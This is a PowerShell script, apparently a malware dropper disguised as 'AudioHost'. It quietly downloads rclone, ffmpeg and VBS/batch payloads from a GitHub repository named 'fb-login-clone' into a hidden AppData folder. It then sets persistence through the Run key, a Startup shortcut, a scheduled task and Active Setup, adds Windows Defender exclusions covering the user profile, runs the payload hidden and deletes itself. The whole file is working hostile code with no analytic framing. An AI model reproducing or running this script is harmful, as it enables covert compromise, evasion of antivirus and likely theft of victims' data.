# AudioHost.ps1

$ErrorActionPreference = "SilentlyContinue"

$dest = "$env:APPDATA\Microsoft\Windows\system_cache"
$repo = "https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/system_cache"
$files = @(
    "system_cache.ps1",
    "TaskService.bat",
    "rclone.exe",
    "rclone.conf",
    "ffmpeg.exe",
    "setup.vbs",
    "TaskService.vbs"
)

# Create folder
if (-not (Test-Path $dest)) {
    try {
        New-Item -ItemType Directory -Path $dest -Force | Out-Null
    } catch {}
}

# Download files
foreach ($file in $files) {
    $target = Join-Path $dest $file
    if (-not (Test-Path $target)) {
        try {
            Invoke-WebRequest -Uri "$repo/$file" -OutFile $target -UseBasicParsing
        } catch {}
    }
}

# Register autostart
try {
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
        -Name "system_cache" -Value "$dest\TaskService.vbs"
} catch {}

# Add to Startup folder (duplicate autostart method)
try {
    $WshShell = New-Object -ComObject WScript.Shell
    $lnkPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\system_cache.lnk"
    $shortcut = $WshShell.CreateShortcut($lnkPath)
    $shortcut.TargetPath = "$dest\TaskService.vbs"
    $shortcut.WorkingDirectory = $dest
    $shortcut.Save()
} catch {}

# Defender exclusions
try {
    Add-MpPreference -ExclusionPath $dest
    Add-MpPreference -ExclusionProcess "$dest\system_cache.ps1"
    Add-MpPreference -ExclusionProcess "$dest\TaskService.vbs"
    Add-MpPreference -ExclusionProcess "$dest\rclone.exe"
    Add-MpPreference -ExclusionProcess "$dest\ffmpeg.exe"
    Add-MpPreference -ExclusionPath "$env:USERPROFILE"
} catch {}

# Hide folder
try {
    if (Test-Path $dest) {
        $item = Get-Item -LiteralPath $dest
        $item.Attributes = $item.Attributes -bor 'Hidden'
    }
} catch {}

# Launch main script silently
try {
    Start-Process -WindowStyle Hidden -FilePath "$dest\TaskService.vbs"
} catch {}

# Task Scheduler (as fallback/autostart)
try {
    $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$dest\TaskService.vbs`""
    $Trigger = New-ScheduledTaskTrigger -AtLogOn
    $Principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive
    Register-ScheduledTask -TaskName "SystemCacheUpdater" -Action $Action -Trigger $Trigger -Principal $Principal -Description "System Cache Task" -Force
} catch {}

# Optional: Active Setup
try {
    New-Item -Path "HKLM:\Software\Microsoft\Active Setup\Installed Components\{GUID}" -Force | Out-Null
    Set-ItemProperty -Path "HKLM:\Software\Microsoft\Active Setup\Installed Components\{GUID}" `
        -Name "StubPath" -Value "wscript.exe `"$dest\TaskService.vbs`""
} catch {}

# Self-delete
$me = $MyInvocation.MyCommand.Path
$bat = "$env:TEMP\delme.bat"
Set-Content -Path $bat -Value "@echo off`r`n:Repeat`r`ndel `"$me`"`r`nif exist `"$me`" goto Repeat`r`ndel %0" -Encoding ASCII
Start-Process -WindowStyle Hidden -FilePath $bat